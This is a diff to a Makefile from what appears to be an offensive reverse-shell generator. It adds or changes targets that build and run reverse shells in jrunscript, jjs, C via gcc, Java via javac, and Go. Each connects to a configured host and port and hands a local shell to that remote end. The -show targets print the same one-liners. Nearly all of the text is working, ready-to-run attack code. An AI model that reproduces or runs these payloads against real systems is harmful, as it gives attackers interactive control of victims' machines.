@@ -25,7 +25,7 @@ show:
 	@printf "TEMPORARY FILE/DIR*: $(GREEN)$(TMP)$(RESET)\n"
 	@printf "* = only necessary for some methods\n"
 	@printf "\n"
-	@printf "To change previous values, run $(UNDERLINE)./configure <shell> <host> <port> <port2> <tmp>$(RESET).\n"
+	@printf "To change previous values, run $(UNDERLINE)./configure <host> <port> <shell> <port2> <tmp>$(RESET).\n"
 	@printf "\n"
 	@printf "Available methods:\n"
 	@$(foreach cmd, $(METHODS), printf "   $(BOLD)$(BLUE)$(cmd)$(RESET)\n";)
@@ -311,20 +311,20 @@ node-show:
 ######################## JRUNSCRIPT ########################
 
 jrunscript:
-	jrunscript -e 'var sock = new java.net.Socket("$(HOST)",$(PORT)); var proc = new java.lang.ProcessBuilder("$(SHELL)").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); }; proc.destroy(); sock.close();'
+	jrunscript -e 'var sock = new java.net.Socket("$(HOST)",$(PORT)); var proc = new java.lang.ProcessBuilder("$(SHELL)").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(100); }; proc.destroy(); sock.close();'
 
 jrunscript-show:
-	@printf "jrunscript -e 'var sock = new java.net.Socket(\"$(HOST)\",$(PORT)); var proc = new java.lang.ProcessBuilder(\"$(SHELL)\").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); }; proc.destroy(); sock.close();'\n"
+	@printf "jrunscript -e 'var sock = new java.net.Socket(\"$(HOST)\",$(PORT)); var proc = new java.lang.ProcessBuilder(\"$(SHELL)\").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(100); }; proc.destroy(); sock.close();'\n"
 
 ############################################################
 
 ############################ JJS ###########################
 
 jjs:
-	echo 'var sock = new java.net.Socket("$(HOST)",$(PORT)); var proc = new java.lang.ProcessBuilder("$(SHELL)").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); }; proc.destroy(); sock.close();' | jjs
+	echo 'var sock = new java.net.Socket("$(HOST)",$(PORT)); var proc = new java.lang.ProcessBuilder("$(SHELL)").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(100); }; proc.destroy(); sock.close();' | jjs
 
 jjs-show:
-	@printf "echo 'var sock = new java.net.Socket(\"$(HOST)\",$(PORT)); var proc = new java.lang.ProcessBuilder(\"$(SHELL)\").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); }; proc.destroy(); sock.close();' | jjs\n"
+	@printf "echo 'var sock = new java.net.Socket(\"$(HOST)\",$(PORT)); var proc = new java.lang.ProcessBuilder(\"$(SHELL)\").redirectErrorStream(true).start(); var pi = proc.getInputStream(), po = proc.getOutputStream(), si = sock.getInputStream(), so = sock.getOutputStream(); while(!sock.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(100); }; proc.destroy(); sock.close();' | jjs\n"
 
 ############################################################
 
@@ -340,26 +340,33 @@ julia-show:
 
 ########################### GCC ############################
 
-C_CODE := src/reverse_shell.c
-
 gcc:
-	gcc $(C_CODE) -o out -DHOST="\"$(HOST)\"" -DPORT=$(PORT) -DSHELL="\"$(SHELL)\""; ./out; rm ./out
+	echo $$'#include <stdlib.h>\n#include <unistd.h>\n#include <arpa/inet.h>\nint main(){ int sock=socket(AF_INET,SOCK_STREAM,0); if (sock==-1) exit(1); struct sockaddr_in server_addr; server_addr.sin_family=AF_INET; server_addr.sin_port=htons($(PORT)); inet_pton(AF_INET,"$(HOST)",&server_addr.sin_addr); if (connect(sock,(struct sockaddr*)&server_addr,sizeof(server_addr))==-1) { close(sock); exit(1); } dup2(sock,0); dup2(sock,1); dup2(sock,2); execl("$(SHELL)","$(SHELL)",NULL); close(sock); }' > $(TMP).c; gcc $(TMP).c -o $(TMP); $(TMP); rm $(TMP).c; rm $(TMP)
 
 gcc-show:
-	@printf "gcc $(C_CODE) -o out -DHOST=\"\\\\\"$(HOST)\\\\\"\" -DPORT=$(PORT) -DSHELL=\"\\\\\"$(SHELL)\\\\\"\"; ./out; rm ./out\n"
+	@printf "echo \$$'#include <stdlib.h>\\\\n#include <unistd.h>\\\\n#include <arpa/inet.h>\\\\nint main(){ int sock=socket(AF_INET,SOCK_STREAM,0); if (sock==-1) exit(1); struct sockaddr_in server_addr; server_addr.sin_family=AF_INET; server_addr.sin_port=htons($(PORT)); inet_pton(AF_INET,\"$(HOST)\",&server_addr.sin_addr); if (connect(sock,(struct sockaddr*)&server_addr,sizeof(server_addr))==-1) { close(sock); exit(1); } dup2(sock,0); dup2(sock,1); dup2(sock,2); execl(\"$(SHELL)\",\"$(SHELL)\",NULL); close(sock); }' > $(TMP).c; gcc $(TMP).c -o $(TMP); $(TMP); rm $(TMP).c; rm $(TMP)\n"
 
 ############################################################
 
 ########################## JAVAC ###########################
 
-JAVA_CODE := src/ReverseShell.java
-JAVA_BYTECODE := ReverseShell
+JAVA_FILE := ReverseShell
 
 javac:
-	javac -d . $(JAVA_CODE); java $(JAVA_BYTECODE) $(HOST) $(PORT) $(SHELL); rm $(JAVA_BYTECODE).class
+	echo 'import java.io.InputStream; import java.io.OutputStream; import java.net.Socket; public class ReverseShell { public static void main(String[] args) throws Exception { Socket sock = new Socket("$(HOST)", $(PORT)); Process proc = new ProcessBuilder("$(SHELL)").redirectErrorStream(true).start(); InputStream pi = proc.getInputStream(); OutputStream po = proc.getOutputStream(); InputStream si = sock.getInputStream(); OutputStream so = sock.getOutputStream(); while (!sock.isClosed()) { while (pi.available() > 0) so.write(pi.read()); while (si.available() > 0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(100); } proc.destroy(); sock.close(); } }' > $(JAVA_FILE).java; javac $(JAVA_FILE).java; java $(JAVA_FILE); rm $(JAVA_FILE).java; rm $(JAVA_FILE).class
 
 javac-show:
-	@printf "javac -d . $(JAVA_CODE); java $(JAVA_BYTECODE) $(HOST) $(PORT) $(SHELL); rm $(JAVA_BYTECODE).class\n"
+	@printf "echo 'import java.io.InputStream; import java.io.OutputStream; import java.net.Socket; public class ReverseShell { public static void main(String[] args) throws Exception { Socket sock = new Socket(\"$(HOST)\", $(PORT)); Process proc = new ProcessBuilder(\"$(SHELL)\").redirectErrorStream(true).start(); InputStream pi = proc.getInputStream(); OutputStream po = proc.getOutputStream(); InputStream si = sock.getInputStream(); OutputStream so = sock.getOutputStream(); while (!sock.isClosed()) { while (pi.available() > 0) so.write(pi.read()); while (si.available() > 0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(100); } proc.destroy(); sock.close(); } }' > $(JAVA_FILE).java; javac $(JAVA_FILE).java; java $(JAVA_FILE); rm $(JAVA_FILE).java; rm $(JAVA_FILE).class\n"
+
+############################################################
+
+############################ GO ############################
+
+go:
+	echo 'package main; import ("net"; "os/exec"); func main() { conn, _ := net.Dial("tcp", "$(HOST):$(PORT)"); cmd := exec.Command("$(SHELL)"); cmd.Stdin = conn; cmd.Stdout = conn; cmd.Stderr = conn; cmd.Run() }' > $(TMP).go; go run $(TMP).go; rm $(TMP).go
+
+go-show:
+	@printf "echo 'package main; import (\"net\"; \"os/exec\"); func main() { conn, _ := net.Dial(\"tcp\", \"$(HOST):$(PORT)\"); cmd := exec.Command(\"$(SHELL)\"); cmd.Stdin = conn; cmd.Stdout = conn; cmd.Stderr = conn; cmd.Run() }' > $(TMP).go; go run $(TMP).go; rm $(TMP).go\n"
 
 ############################################################
 
